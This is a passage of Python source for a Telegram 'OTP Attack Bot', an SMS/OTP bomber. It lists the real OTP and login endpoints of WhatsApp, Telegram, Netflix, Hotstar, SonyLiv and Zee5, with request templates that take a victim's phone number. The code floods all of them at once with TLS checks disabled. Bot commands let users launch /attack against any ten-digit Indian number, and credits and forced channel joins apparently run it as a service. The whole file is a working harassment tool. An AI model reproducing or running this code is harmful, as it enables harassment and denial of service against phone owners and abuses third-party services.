            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"flow_token":"","input_flow_data":{{"flow_context":{{"debug_overrides":{{}},"start_location":{{"location":"splash_screen"}}}},"requested_variant":{{"sign_up_variant":"default"}}}},"subtask_versions":{{}}}}'
    },

    # 35. WhatsApp
    {
        "url": "https://web.whatsapp.com/api/account",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"cc":"91","in":"{phone}","method":"sms"}}'
    },

    # 36. Telegram
    {
        "url": "https://my.telegram.org/auth/send_password",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'phone=+91{phone}'
    },

    # 37. Netflix
    {
        "url": "https://www.netflix.com/in/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'userLoginId={phone}'
    },

    # 38. Hotstar
    {
        "url": "https://api.hotstar.com/in/aadhar/v2/web/in/user/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },

    # 39. SonyLiv
    {
        "url": "https://apiv2.sonyliv.com/ums/v2/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "SonyLiv/4.0.0 (Android 13)",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"91"}}'
    },

    # 40. Zee5
    {
        "url": "https://userapi.zee5.com/v2/user/sendotp_v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "ZEE5/4.0.0 (Android 13)",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"mobile_no":"{phone}","country_code":"91"}}'
    }
]

# ==================== BOT FUNCTIONS ====================

async def check_subscription(user_id: int, app) -> bool:
    """Check if user is subscribed to the main channel (last one in list)"""
    try:
        # Sirf last wale channel ka check karenge
        main_channel = CHANNELS[-1]
        try:
            member = await app.bot.get_chat_member(main_channel["id"], user_id)
            if member.status in ["member", "administrator", "creator"]:
                return True
            else:
                return False
        except Exception as e:
            logger.error(f"Error checking membership: {e}")
            return False
    except Exception as e:
        logger.error(f"Subscription check error: {e}")
        return False

async def send_otp_requests(phone: str, progress_callback=None):
    """Send OTP requests to all APIs"""
    global running
    successful_apis = []
    failed_apis = []
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i, api in enumerate(API_CONFIGS):
            if not running:
                break
                
            task = asyncio.create_task(send_single_request(session, api, phone, i+1))
            tasks.append(task)
            
            # Add small delay to avoid rate limiting
            await asyncio.sleep(0.1)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed_apis.append(i+1)
            elif result:
                successful_apis.append(i+1)
                
            if progress_callback and (i+1) % 5 == 0:
                await progress_callback(i+1, len(API_CONFIGS))
    
    return successful_apis, failed_apis

async def send_single_request(session, api, phone, api_number):
    """Send single API request"""
    try:
        data = api["data"](phone)
        headers = api["headers"].copy()
        
        # Calculate content-length if needed
        if "content-length" in headers and callable(headers["content-length"]):
            headers["content-length"] = headers["content-length"](data)
        
        timeout = aiohttp.ClientTimeout(total=10)
        
        if api["method"] == "POST":
            async with session.post(
                api["url"], 
                data=data, 
                headers=headers, 
                timeout=timeout,
                ssl=False
            ) as response:
                status = response.status
                if status in [200, 201, 202]:
                    logger.info(f"API {api_number} Success: {status}")
                    return True
                else:
                    logger.warning(f"API {api_number} Failed: {status}")
                    return False
        else:
            async with session.get(
                api["url"], 
                headers=headers, 
                timeout=timeout,
                ssl=False
            ) as response:
                status = response.status
                if status == 200:
                    logger.info(f"API {api_number} Success: {status}")
                    return True
                else:
                    logger.warning(f"API {api_number} Failed: {status}")
                    return False
                    
    except Exception as e:
        logger.error(f"API {api_number} Error: {str(e)}")
        return False

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start OTP attack"""
    global running, current_task
    
    if not await check_subscription(update.effective_user.id, context.application):
        keyboard = []
        for channel in CHANNELS:
            keyboard.append([InlineKeyboardButton(channel["name"], url=channel["link"])])
        keyboard.append([InlineKeyboardButton("✅ SUBSCRIBED", callback_data="check_subscription")])
        
        await update.message.reply_text(
            "📢 **Please join all channels first to use this bot:**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return
    
    if running:
        await update.message.reply_text("⚠️ Attack already running! Stop current attack first.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📱 **OTP Attack Bot**\n\n"
            "Usage: /attack <phone_number>\n"
            "Example: /attack 9876543210\n\n"
            "⚠️ Use responsibly!"
        )
        return
    
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Please provide 10 digit number.")
        return
    
    running = True
    user_id = update.effective_user.id
    
    # Initialize user credits
    if user_id not in user_credits:
        user_credits[user_id] = 10  # Free credits
    
    if user_credits[user_id] <= 0:
        await update.message.reply_text("❌ Insufficient credits! Contact admin.")
        running = False
        return
    
    # Deduct credit
    user_credits[user_id] -= 1
    
    status_msg = await update.message.reply_text(
        f"🚀 Starting OTP attack on +91{phone}\n"
        f"📊 Total APIs: {len(API_CONFIGS)}\n"
        f"⏳ Please wait..."
    )
    
    async def progress_callback(current, total):
        progress = int((current / total) * 100)
        bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
        try:
            await status_msg.edit_text(
                f"🚀 Attacking: +91{phone}\n"
                f"📊 Progress: {current}/{total} APIs\n"
                f"📈 {bar} {progress}%\n"
                f"⏰ Time: {int(current * 0.5)}s"
            )
        except:
            pass
    
    try:
        start_time = time.time()
        successful_apis, failed_apis = await send_otp_requests(phone, progress_callback)
        end_time = time.time()
        
        duration = int(end_time - start_time)
        
        await status_msg.edit_text(
            f"✅ Attack Completed!\n"
            f"📱 Target: +91{phone}\n"
            f"✅ Successful: {len(successful_apis)} APIs\n"
            f"❌ Failed: {len(failed_apis)} APIs\n"
            f"⏱ Duration: {duration}s\n"
            f"💳 Credits left: {user_credits[user_id]}\n\n"
            f"🔥 SMS/OTP sent successfully!"
        )
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Attack failed: {str(e)}")
    finally:
        running = False
        current_task = None

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    global running, current_task
    
    if not running:
        await update.message.reply_text("ℹ️ No attack running!")
        return
    
    running = False
    if current_task:
        current_task.cancel()
    
    await update.message.reply_text("🛑 Attack stopped!")

async def credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user credits"""
    user_id = update.effective_user.id
    credit_count = user_credits.get(user_id, 10)
    
    await update.message.reply_text(
        f"💳 Your Credits: {credit_count}\n\n"
        f"Free credits reset daily!\n"
        f"Contact admin for more credits."
    )

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    total_apis = len(API_CONFIGS)
    active_users = len(user_credits)
    total_credits_used = sum(10 - credits for credits in user_credits.values())
    
    await update.message.reply_text(
        f"📊 Bot Statistics:\n"
        f"• Total APIs: {total_apis}\n"
        f"• Active Users: {active_users}\n"
        f"• Total Attacks: {total_credits_used}\n"
        f"• Bot Status: {'🟢 ONLINE' if bot_active else '🔴 OFFLINE'}"
    )

async def subscription_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle subscription check callback"""
    query = update.callback_query
    await query.answer()
    
    if await check_subscription(query.from_user.id, context.application):
        await query.edit_message_text(
            "✅ Subscription verified! You can now use the bot.\n\n"
            "Use /attack <phone> to start OTP attack."
        )
    else:
        keyboard = []
        for channel in CHANNELS:
            keyboard.append([InlineKeyboardButton(channel["name"], url=channel["link"])])
        keyboard.append([InlineKeyboardButton("✅ SUBSCRIBED", callback_data="check_subscription")])
        
        await query.edit_message_text(
            "❌ Please join ALL channels first!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def admin_add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to add credits"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
        
        if user_id not in user_credits:
            user_credits[user_id] = 0
        
        user_credits[user_id] += amount
        await update.message.reply_text(f"✅ Added {amount} credits to user {user_id}")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount!")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    
    if not await check_subscription(user.id, context.application):
        keyboard = []
        for channel in CHANNELS:
            keyboard.append([InlineKeyboardButton(channel["name"], url=channel["link"])])
        keyboard.append([InlineKeyboardButton("✅ SUBSCRIBED", callback_data="check_subscription")])
        
        await update.message.reply_text(
            f"👋 Welcome {user.first_name}!\n\n"
            f"📢 **Please join all channels to use this bot:**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return
    
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\n\n"
        f"🚀 **OTP Attack Bot**\n"
        f"• {len(API_CONFIGS)}+ APIs Integrated\n"
        f"• Maximum SMS/OTP Delivery\n"
        f"• Fast & Efficient\n\n"
        f"📖 **Commands:**\n"
        f"/attack <phone> - Start OTP attack\n"
        f"/stop - Stop current attack\n"
        f"/credits - Check your credits\n"
        f"/stats - Bot statistics\n\n"
        f"⚠️ Use responsibly!"
    )

# ==================== MAIN BOT SETUP ====================

def main():
    """Start the bot"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", start_attack))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("credits", credits_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("addcredits", admin_add_credits))
    app.add_handler(CallbackQueryHandler(subscription_check, pattern="check_subscription"))
    
    logger.info("Bot is starting...")
    print(f"✅ Bot started with {len(API_CONFIGS)} APIs!")
    print("🤖 OTP Attack Bot is now running...")
    
    app.run_polling()

if __name__ == "__main__":
    main()
